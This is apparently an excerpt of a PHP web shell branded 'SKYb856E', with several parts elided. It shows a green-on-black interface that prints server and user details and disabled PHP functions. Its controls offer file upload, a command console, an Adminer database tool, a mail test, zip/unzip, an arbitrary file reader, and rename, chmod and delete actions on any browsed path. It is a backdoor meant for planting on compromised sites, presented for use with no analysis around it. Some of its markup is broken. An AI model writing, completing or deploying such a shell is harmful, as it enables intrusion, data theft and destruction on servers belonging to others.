...
echo "
<center>
<div style='border: 1px solid #0f0; padding: 10px; background-color: #000; box-shadow: 2px 2px 8px rgba(0, 255, 0, 0.5); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; font-size: 10px; color: #0f0; font-family: monospace;'>
    <h1 style='color: green;'><strong>root@SKYb856E:~$ - <a href='" . $urlPath . "' style='color: blue;'>" . $_SERVER['HTTP_HOST'] . "</a></strong></h1>
    </div>
</center>
<div style='border: 1px solid #0f0; padding: 10px; background-color: #000; box-shadow: 2px 2px 8px rgba(0, 255, 0, 0.5); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; font-size: 10px; color: #0f0; font-family: monospace;'>
    <h4 style='margin: 0; padding: 5px;'>System: <span style='color: #0f0;'>" . @php_uname() . "</span></h4>
    <h4 style='margin: 0; padding: 5px;'>Hostname: <span style='color: #0f0;'>" . @gethostname() . "</span> | Server Software: <span style='color: #0f0;'>" . $_SERVER['SERVER_SOFTWARE'] . "</span></h4>
    <h4 style='margin: 0; padding: 5px;'>User ID: <span style='color: #0f0;'>" . @getmyuid() . "</span> | Group ID: <span style='color: #0f0;'>" . @getmygid() . "</span> | Username: <span style='color: #0f0;'>" . @get_current_user() . "</span></h4>
    <h4 style='margin: 0; padding: 5px;'>Server IP: <span style='color: #0f0;'>" . gethostbyname($_SERVER['HTTP_HOST']) . "</span> | Port: <span style='color: #0f0;'>" . $_SERVER['SERVER_PORT'] . "</span> | Your IP: <span style='color: #0f0;'>" . $_SERVER['REMOTE_ADDR'] . "</span></h4>
    <h4 style='margin: 0; padding: 5px;'>PHP Version: <span style='color: #0f0;'>" . @phpversion() . "</span> | <a href='?id=phpinfo' style='color: #0ff;'>[ PHP INFO ]</a> | Safe Mode: <span style='color: #0f0;'>" . (ini_get('safe_mode') ? 'ON' : 'OFF') . "</span> | Domains: <span style='color: #0f0;'>" . $count2 . "</span></h4>
    <h4 style='margin: 0; padding: 5px; white-space: pre-wrap; word-wrap: break-word;'>Disable Functions: <span style='color: red;'>" . @ini_get('disable_functions') . "</span></h4>
</div>

<h2 style='border: 1px solid #0f0; padding: 10px; background-color: #000; color: #0f0; box-shadow: 2px 2px 8px rgba(0, 255, 0, 0.5); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; font-size: 15px; font-family: monospace;'>
    DIR~: " . createBreadcrumb($directory) . "
</h2>

<div style='border: 1px solid #0f0; padding: 10px; background-color: #000; box-shadow: 2px 2px 8px rgba(0, 255, 0, 0.3); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; display: flex; flex-wrap: wrap; gap: 10px; font-family: monospace;'>
	<div>
		<form method='get' action=''>
			<input type='hidden' name='dir' value='" . $directory . "'>
			<input type='hidden' name='upload' value='upload'>
			<input type='submit' value='[ Upload ]' style='padding: 10px 20px; background-color: #111; color: #0f0; border: 1px solid #0f0; cursor: pointer;'>
		</form>
    </div> 	
	<div>
		<form method='get' action=''>
			...
			<input type='submit' value='[ Console ]' style='padding: 10px 20px; background-color: #111; color: #0f0; border: 1px solid #0f0; cursor: pointer;'>
		</form>
    </div>    
	<div>
		<form method='post'>
			<input type='submit' name='Summon' value='[ Adminer ]' style='padding: 10px 20px; background-color: #111; color: #0f0; border: 1px solid #0f0; cursor: pointer;'>
		</form>
	</div>
	<div>
		<form method='get' action=''>
			...
			<input type='submit' value='[ Mail Test ]' style='padding: 10px 20px; background-color: #111; color: #0f0; border: 1px solid #0f0; cursor: pointer;'>
		</form>
	</div>
	<div>
		<form method='post'>
			<input type='submit' name='zip_files' value='[ Zip Files ]' style='padding: 10px 20px; background-color: #111; color: #0f0; border: 1px solid #0f0; cursor: pointer;'>
		</form>
	</div>
	<div>
		<form method='get' action=''>
			...
			<input type='submit' value='[ Unzip Files ]' style='padding: 10px 20px; background-color: #111; color: #0f0; border: 1px solid #0f0; cursor: pointer;'>
		</form>
	</div>
	<div>
		<form method='get' action=''>
			...
			<input type='submit' value='[ Create file ]' style='padding: 10px 20px; background-color: #111; color: #0f0; border: 1px solid #0f0; cursor: pointer;'>
		</form>
    </div>
	<div>
		<form method='get' action=''>
			...
			<input type='submit' value='[ Create Folder ]' style='padding: 10px 20px; background-color: #111; color: #0f0; border: 1px solid #0f0; cursor: pointer;'>
		</form>
    </div>
</div>
";
...
if (isset($_GET['dir'])) {
    if (isset($_GET['creat_file'])) {
        echo "
        <div style='border: 1px solid #00ff00; padding: 10px; background-color: #000; box-shadow: 0 0 8px #00ff00; color: #00ff00; font-family: monospace; max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto;'>
            <h2>Create File :</h2>
            <form method='post'>
...
if (isset($_GET['dir'])){
	if (isset($_GET['mailewa'])){
		...
		if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['email'])) {
			...
			$message .= "<p>This is a test email sent from mail</p>";
			$message .= "</body></html>";
        ...
        if (isset($_POST['execute'])) {
        	...
        	if (!empty($result_command)) {
                echo "<div style='margin-top: 20px;'>
                           ...
                           <pre style='white-space: pre-wrap; background-color: #000; color: #00ff00; font-family: monospace; overflow-y: auto; box-sizing: border-box; height: 500px; width: 100%; max-width: 100%; margin-top: 10px; border: 1px solid #00ff00; box-shadow: 0 0 8px #00ff00; padding: 10px;'>$result_command</pre>
                        </div>";
        	} else {
...
if (isset($_GET['readfile'])) {
    ...
    if (is_readable($fileToRead)) {
        ...
        if ($content !== false) {
            echo "<pre style='white-space: pre-wrap; background-color: #000; color: #00ff00; font-family: monospace; overflow-y: auto; box-sizing: border-box; height: 500px; width: 100%; max-width: 100%; margin-top: 10px; border: 1px solid #00ff00; box-shadow: 0 0 8px #00ff00; padding: 10px;'>";
...
foreach ($folders as $folder) {
    ...
    $color = is_writable($path) ? "#00ff00" : "red";
    $permissions = getPermissions($path);
    $size = is_file($path) ? formatFileSize(filesize($path)) : '-';
    echo "
    <tr style='color: #00ff00; background-color: #000; font-family: monospace;'>
        <td style='font-size: 30px; text-align: center;'>
            <a style='color:#00ff00; text-decoration:none;' href='?dir=" . urlencode($path) . "'>📁</a>
        </td>
        <td>
            <a style='color:#00ff00; text-decoration:none;' href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($folder, ENT_QUOTES, 'UTF-8') . "</a>
        </td>
        ...
        <td style='text-align: center;'>
            <form method='get' style='display:inline;'>
                ...
                <select name='action' style='background:#000; color:#00ff00; border:1px solid #00ff00;'>
                    <option value=''>Select</option>
                    <option value='rename'>Rename</option>
                    <option value='chmod'>Chmod</option>
                    <option value='delete'>Delete</option>
                </select>
                <button type='submit' style='background:#000; color:#00ff00; border:1px solid #00ff00;'>go To</button>
            </form>
        </td>
    </tr>";
}
...
foreach ($files as $file) {
    ...
    $permissions = @getPermissions($path);
    $size = is_file($path) ? formatFileSize(filesize($path)) : '-';
    $readLink = "?dir=" . urlencode($directory) . "&readfile=" . urlencode($directory . DIRECTORY_SEPARATOR . $file);

    echo "
    <tr style='color: #00ff00; background-color: #000; font-family: monospace;'>
        <td style='font-size: 30px; text-align: center;'>
            <a style='color:#00ff00; text-decoration:none;' href='$readLink'>📄</a>
        </td>
        <td>
            <a style='color:#00ff00; text-decoration:none;' href='$readLink'>" . htmlspecialchars($file, ENT_QUOTES, 'UTF-8') . "</a>
        </td>
        <td style='text-align: center;'>$size</td>
        <td style='color: $color; text-align: center;'>$permissions</td>
        <td style='text-align: center;'>
...
echo "</table>
          <div style='border: 1px solid #00ff00; padding: 10px; background-color: #000000; box-shadow: 0 0 8px rgba(0, 255, 0, 1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; font-size: 12px; text-align: center; color: #00ff00; font-family: monospace;'>
              &copy; " . date('Y') . " ✓ By style='text-decoration: none; color: #e30000ff; font-weight: bold;'>SKYb856E</a>.
          </div>";?>
